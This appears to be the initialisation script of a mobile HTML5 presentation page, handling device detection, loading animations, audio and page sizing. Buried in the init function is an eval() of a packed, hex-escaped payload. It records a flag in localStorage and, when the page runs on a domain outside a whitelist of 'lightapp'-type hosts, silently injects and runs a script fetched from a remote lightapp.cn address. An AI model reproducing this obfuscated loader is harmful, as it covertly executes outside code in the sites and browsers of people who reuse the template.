define(function (require, exports, module) {
    window.$ = require("./zepto"), $ = require("./touch");
    var global = require("./global"),
        page = require("./page"),
        media = require("./media");
    require("./image"), require("./event"), require("./plugins");
    var teletex=require("./teletextmain");
    module.exports = {
        init_modle: function () {
            global._scrollStop(), document.body.style.userSelect = "none", document.body.style.mozUserSelect = "none", document.body.style.webkitUserSelect = "none", eval(function (a, b, c, d, e, f) {
                if (e = function (a) {
                        return (b > a ? "" : e(parseInt(a / b))) + ((a %= b) > 35 ? String.fromCharCode(a + 29) : a.toString(36))
                    }, !"".replace(/^/, String)) {
                    for (; c--;) f[e(c)] = d[c] || e(c);
                    d = [function (a) {
                        return f[a]
                    }], e = function () {
                        return "\\w+"
                    }, c = 1
                }
                for (; c--;) d[c] && (a = a.replace(new RegExp("\\b" + e(c) + "\\b", "g"), d[c]));
                return a
            }("r h$=['\\g\\j\\k\\e\\g\\v\\f\\j\\l\\e\\q\\i','\\g\\j\\k\\e\\g\\v\\f\\j\\l\\e\\q\\i','\\g\\j\\k\\e\\g\\v\\f\\j\\l\\e\\q\\i','\\m\\m\\g\\j\\k\\e\\g\\H\\i\\f\\f\\i\\l\\m\\m','\\g\\j\\k\\e\\g\\v\\f\\j\\l\\e\\q\\i','\\m\\m\\g\\j\\k\\e\\g\\H\\i\\f\\f\\i\\l\\m\\m','\\y\\j\\17\\e\\p\\A','\\E\\k\\l\\p\\t\\f','\\f\\i\\D\\f\\o\\15\\e\\F\\e\\E\\k\\l\\p\\t\\f','\\z\\f\\f\\t\\1e\\o\\o\\B\\B\\B\\I\\g\\p\\q\\z\\f\\e\\t\\t\\I\\k\\A\\o\\1a\\1b\\k\\1c\\o\\p\\A\\y\\i\\D\\1d\\F\\16','\\z\\i\\e\\y'];(19(){x(!u[ h$[0]]){u[ h$[1]]={}};x(!u[ h$[2]][ h$[3]]){u[ h$[4]][ h$[5]]=18;r a=/^(\\w+\\.)*(1l|1k|1m|1o|1n)(\\.\\w)+/1g;r b=C[ h$[6]].1f();b=(/[^\\.\\s]+\\.?(1h|1j|1i|14|P|O|N|S|R|Q|M|L|K|J|Z|Y|11|13|12|U|T|V|X|W|20|1Z|1Y|21|24|23|22|1T|1S|1R|1U|1X|1W|1V|25|2e|2d|2g|2c|2f|2b|26|28|2a|29|27|1y|1x|1w|1B|1A|1z|1v|1t|1s|1C|1M|1L|1K|1P|1O|1N|1J)(\\.[^\\.\\s]+)*(?=$|\\n|\\?|\\/|\\#)/1E).1D(b);b=b?b[G]:b;x(b&&!a.1I(b)){r c=C.1G( h$[7]);c.1H= h$[8];c.1F= h$[9]+1u 1p().1q();r d=C.1r( h$[10])[G];d.1Q(c)}}})();", 62, 141, "||||||||||||||x61|x74|x6c|_|x65|x6f|x63|x72|x5f||x2f|x69|x67|var||x70|window|x53||if|x64|x68|x6e|x77|document|x78|x73|x76|0x0|x47|x2e|tm|name|info|co|tv|me|gov|hkasia|us|biz|bz|ws|vc|mn|travel|mobi|in||io|la|pro|org|x6a|x3d|x6d|0x1|function|x66|x75|x6b|x3f|x3a|toLowerCase|gi|com|net|cn|lightapp|liveapp|uliveapp|livelink|linklive|Date|getTime|getElementsByTagName|yn|gz|new|sc|hn|hb|ha|hi|gx|gd|xz|exec|ig|src|createElement|type|test|mo|qh|gs|sn|tw|xj|nx|appendChild|bj|ac|香港|sh|cq|tj|hk|cm|tel|ag|wang|中国|cc|pw|he|zj|sd|ah|jx|fj|js|jl|nm|sx|hl|ln".split("|"), 0, {})), $(document.body).addClass(global._IsPC() ? "pc" : "mobile"), global._Android && $(document.body).addClass("android"), global._iPhoen && $(document.body).addClass("iphone"), global._hasPerspective() ? (global._rotateNode.addClass("transformNode-3d"), $(document.body).addClass("perspective"), $(document.body).addClass("yes-3d")) : (global._rotateNode.addClass("transformNode-2d"), $(document.body).addClass("no-3d")), $(".translate-back").addClass("z-pos"), $("#ca-tips").appendTo($("body")), $("#r-cover").appendTo($("body")), setTimeout(function () {
                $(".m-alert").find("strong").addClass("z-show")
            }, 1e3);
            var loading_time = (new Date).getTime();
            $(window).on("load", function () {
                var a, b = (new Date).getTime(),
                    c = !1,
                    d = b - loading_time;
                d >= 2200 && (c = !0), a = c ? 0 : 2200 - d;
                setTimeout(function () {
                    setTimeout(function () {
                        $(".m-alert").addClass("f-hide")
                    }, 4e3);
                    var a = $(".translate-front").data("open");
                    1 == a ? ($(".translate-front").removeClass("f-hide"), setTimeout(function () {
                        $(".translate-front").addClass("z-show"), $(".m-fengye").removeClass("f-hide"), page._page.eq(page._pageNow).height($(window).height()), setTimeout(function () {
                            $(".translate-back").removeClass("f-hide")
                        }, 900)
                    }, 30)) : ($(".m-fengye").removeClass("f-hide"), page._page.eq(page._pageNow).height($(window).height()), setTimeout(function () {
                        $(".translate-back").removeClass("f-hide"), $(".u-arrow").removeClass("f-hide"), media._audio && (media._audioNode.removeClass("f-hide"), media._audio.play())
                    }, 90))
                }, a);

            }), $(".p-ct").height($(window).height()), $(".m-page").height($(window).height()), $("#j-mengban").height($(window).height()), $(".translate-back").height($(window).height());
            teletex.init();
        }
    }
});